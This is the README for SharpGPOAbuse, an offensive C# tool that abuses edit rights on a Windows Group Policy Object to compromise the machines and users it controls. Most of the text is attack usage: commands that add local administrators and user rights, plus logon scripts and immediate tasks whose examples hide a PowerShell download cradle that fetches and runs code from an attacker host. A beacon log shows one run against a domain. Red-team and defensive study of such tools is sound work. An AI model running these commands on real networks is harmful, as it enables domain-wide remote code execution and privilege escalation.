# SharpGPOAbuse
SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.

More details can be found at the following blog post: [https://labs.mwrinfosecurity.com/tools/sharpgpoabuse](https://labs.mwrinfosecurity.com/tools/sharpgpoabuse)

## Compile Instructions ##
The project is SDK-style and targets **.NET Framework 3.5**. The `Microsoft.NETFramework.ReferenceAssemblies` NuGet package supplies the framework reference assemblies, so it **compiles** on Windows, Linux and macOS with the .NET SDK. `Costura.Fody` embeds `CommandLine.dll` into a single executable.

> The output is always a **Windows executable** — the tool uses Windows-only Active Directory APIs and must be run on a domain-joined Windows host. Building elsewhere is a convenience, not a Linux port.

### .NET SDK (Windows / Linux / macOS)
```bash
dotnet build SharpGPOAbuse.sln -c Release
```
Output: `SharpGPOAbuse/bin/Release/net35/SharpGPOAbuse.exe`

### Windows (Visual Studio)
Open the solution in Visual Studio 2017 or later and build. NuGet packages restore automatically.

## Usage ##
```
Usage:
        SharpGPOAbuse.exe <AttackType> <AttackOptions>
```

## Attacks Types ## 
Currently SharpGPOAbuse supports the following options:

| Option               | Description                               |
| ---------------------|-------------------------------------------|
| [--AddUserRights](#adding-user-rights) | Add rights to a user                      |
| [--AddLocalAdmin](#adding-a-local-admin)      | Add a user to the local admins group      |
| [--AddComputerScript](#configuring-a-user-or-computer-logon-script)  | Add a new computer startup script         |
| [--AddUserScript](#configuring-a-user-or-computer-logon-script)      | Configure a user logon script             |
| [--AddComputerTask](#configuring-a-computer-or-user-immediate-task)    | Configure a computer immediate task       |
| [--AddUserTask](#configuring-a-computer-or-user-immediate-task)        | Add an immediate task to a user           |

## Attack Options

### Adding User Rights 
```
Options required to add new user rights:
--UserRights
        Set the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.
--UserAccount
        Set the account to add the new rights.
--GPOName
        The name of the vulnerable GPO.
        
Example:
        SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

### Adding a Local Admin 
The account is **added** to the local Administrators group of the computers controlled by the GPO. Existing members are preserved (this uses the additive Restricted Groups `Memberof` directive rather than the enforcing `Members` directive, so it will not wipe or replace current admins).
```
Options required to add a new local admin:
--UserAccount
        Set the name of the account to be added in local admins.
--GPOName
        The name of the vulnerable GPO.

Example:
        SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

### Configuring a User or Computer Logon Script  
```
Options required to add a new user or computer startup script:
--ScriptName
        Set the name of the new startup script.
--ScriptContents
        Set the contents of the new startup script.
--GPOName
        The name of the vulnerable GPO.

Example: 
        SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

If you want to run the malicious script only on a specific user or computer controlled by the vulnerable GPO, you can add an if statement within the malicious script:
```
SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "if %username%==<targetusername> powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

### Configuring a Computer or User Immediate Task  
```
Options required to add a new computer or user immediate task:

--TaskName
        Set the name of the new computer task.
--Author
        Set the author of the new task (use a DA account).
--Command
        Command to execute.
--Arguments
        Arguments passed to the command.
--GPOName
        The name of the vulnerable GPO.

Additional User Task Options:
--FilterEnabled
        Enable Target Filtering for user immediate tasks.
--TargetUsername
        The user to target. The malicious task will run only on the specified user. Should be in the format <DOMAIN>\<USERNAME>
--TargetUserSID
        The targeted user's SID.

Additional Computer Task Options:
--FilterEnabled
        Enable Target Filtering for computer immediate tasks.
--TargetDnsName
        The DNS name of the computer to target. The malicious task will run only on the specified host.
        
Example: 
        SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

If you want to run the malicious task only on a specific user or computer controlled by the vulnerable GPO you can use something similar to the following:
```
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName target.domain.com

```

## Additional Options 
| Option               | Description                               |
| ---------------------|-------------------------------------------|
| --DomainController   | Set the target domain controller          |
| --Domain             | Set the target domain                     |
| --Force              | Overwrite existing files if required      | 

## Example Output
```
beacon> execute-assembly /root/Desktop/SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
[*] Tasked beacon to run .NET program: SharpGPOAbuse_final.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"I
EX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
[+] host called home, sent: 171553 bytes
[+] received output:
[+] Domain = europa.com
[+] Domain Controller = EURODC01.europa.com
[+] Distinguished Name = CN=Policies,CN=System,DC=europa,DC=com
[+] GUID of "Default Server Policy" is: {877CB769-3543-40C6-A757-F2DF4E5E28BD}
[+] Creating file \\europa.com\SysVol\europa.com\Policies\{877CB769-3543-40C6-A757-F2DF4E5E28BD}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```
